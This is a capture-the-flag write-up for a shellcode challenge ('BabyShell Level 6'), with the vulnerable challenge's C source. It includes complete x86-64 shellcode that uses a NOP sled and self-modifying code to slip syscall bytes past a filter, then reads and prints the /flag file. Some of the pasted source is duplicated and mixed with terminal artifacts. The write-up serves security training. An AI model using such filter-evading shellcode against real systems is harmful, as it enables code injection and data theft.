# BabyShell Level 6
This one was a easy level, extremely similar to the last one we just did, but this time the first 4096 bytes of the program have been removed write permissions, this means we can't write shellcode on the stack unless we put 4096 bytes of junk before our shellcode.

*Note that we still have the same filter on syscalls than the last challenge, for this reason we will reuse the shellcode i wrote.*

```x86asm
.global _start
_start:
.intel_syntax noprefix
    .rept 4096
    nop
    .endr

    # prepare syscall
    mov byte ptr[rip+label], 0x0f
    mov byte ptr[rip+label+1], 0x05
    lea r9, [rip+label]

    # clear registers
    xor rbx, rbx
    xor rdx, rdx
    xor rsi, rsi
    xor rdi, rdi
    xor r10, r10

    # open flag file
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rax, 2
    call r9

label:
    .word 0x0000

    xor r9, r9
    # prepare next syscall
    mov byte ptr[rip+label2], 0x0f
    mov byte ptr[rip+label2+1], 0x05
    lea r9, [rip+label2]

    xor rsi, rsi
    xor r10, r10
    xor rdi, rdi
    xor rdx, rdx
    xor rbx, rbx
    # sendfile
    mov rdi,1
    mov rsi, rax
    mov r10, 100
    mov rax, 40
    call r9
label2:
    .word 0x0000

    xor r9, r9
    # prepare syscall
    mov byte ptr[rip+label3], 0x0f
    mov byte ptr[rip+label3+1], 0x05
    lea r9, [rip+label3]
    # exit
    xor rsi, rsi
    xor r10, r10
    xor rax, rax
    xor rdi, rdi
    mov rax, 60
    mov rdi, 5
    call r9

label3:
    .word 0x0000
```

Compile the shellcode with gcc `gcc -w -nostdlib -static solve.s -o solve`, then you can extract the bytes of the `.text section` using `objcopy --dump-section .text=solver ./solve`, then you can run the program with our solver file redirected to standard input `./babyshell_level6 <solver`. 

Another cool thing is that we are given the source code for this challenge which is the following one.
```c
#define CAPSTONE_ARCH CS_ARCH_X86                                                                                                                                                                                                            #define CAPSTONE_MODE CS_MODE_64
#include <sys/mman.h>                                                                                                                                                                                                               [66/1973]#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>                                                                                                                                                                                                                          #include <stdio.h>
                                                                                                                                                                                                                                             #include <capstone/capstone.h>
                                                                                                                                                                                                                                             #define CAPSTONE_ARCH CS_ARCH_X86                                                                                                                                                                                                            #define CAPSTONE_MODE CS_MODE_64
                                                                                                                                                                                                                                             void print_disassembly(void *shellcode_addr, size_t shellcode_size)                                                                                                                                                                          {                                                                                                                                                                                                                                                csh handle;                                                                                                                                                                                                                                  cs_insn *insn;                                                                                                                                                                                                                               size_t count;
                                                                                                                                                                                                                                                 if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)                                                                                                                                                                             {                                                                                                                                                                                                                                                printf("ERROR: disassembler failed to initialize.\n");                                                                                                                                                                                                                                                                                                                                                                                                                            void print_disassembly(void *shellcode_addr, size_t shellcode_size)                                                                                                                                                                          {                                                                                                                                                                                                                                                csh handle;                                                                                                                                                                                                                                  cs_insn *insn;                                                                                                                                                                                                                               size_t count;
                                                                                                                                                                                                                                                 if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)                                                                                                                                                                             {                                                                                                                                                                                                                                                printf("ERROR: disassembler failed to initialize.\n");                                                                                                                                                                               
        return;
    }                                                                                                                                                                                                                               [43/1973]
    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {                                                                                                                                                                                                                                                size_t j;                                                                                                                                                                                                                                    printf("      Address      |                      Bytes                    |          Instructions\n");                                                                                                                                      printf("------------------------------------------------------------------------------------------\n");                                                                                                                              
        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");                                                                                                                                                                            printf("      Address      |                      Bytes\n");                                                                                                                                                                                 printf("--------------------------------------------------------------------\n");                                                                                                                                                            for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

void *shellcode_mem;
size_t shellcode_size;

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    puts("This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
    puts("as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
    puts("practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
    puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
    for (int i = 3; i < 10000; i++) close(i);
    for (char **a = argv; *a != NULL; a++) memset(*a, 0, strlen(*a));
    for (char **a = envp; *a != NULL; a++) memset(*a, 0, strlen(*a));

    shellcode_mem = mmap((void *) 0x14c61000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    printf("[LEAK] Mapping shellcode memory at %p!\n", shellcode_mem);
    assert(shellcode_mem == (void *) 0x14c61000);

    puts("Reading 0x2000 bytes from stdin.\n");
    shellcode_size = read(0, shellcode_mem, 0x2000);
    assert(shellcode_size > 0);

    puts("Executing filter...\n");
    puts("This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls");
    puts("are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05");
    puts("(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to");
    puts("insert the `syscall` instructions at runtime.\n");
    for (int i = 0; i < shellcode_size; i++)
    {
        uint16_t *scw = (uint16_t *)((uint8_t*)shellcode_mem + i);
        if (*scw == 0x80cd || *scw == 0x340f || *scw == 0x050f)
        {
            printf("Failed filter at byte %d!\n", i);
            exit(1);
        }
    }

    puts("Removing write permissions from first 4096 bytes of shellcode.\n");
    assert(mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC) == 0);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode_mem, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");
    ((void(*)())shellcode_mem)();
```

First thing to note is that the program uses the `libcapstone` library as a disassembly framework, capstone will basically take the raw bytes we sent to it and disassemble them, then print the instructions to the screen. If you want to know more about disassembling raw bytes using [capstone](http://www.capstone-engine.org), make sure to check the section [here](http://www.capstone-engine.org/lang_c.html) for the C language.

So in main we first allocate 0x2000 bytes of memory space at address 0x14c61000, then we read 2000 bytes of input at this address (our shellcode), and finally at the end we call our shellcode `((void(*)())shellcode_mem)()`.
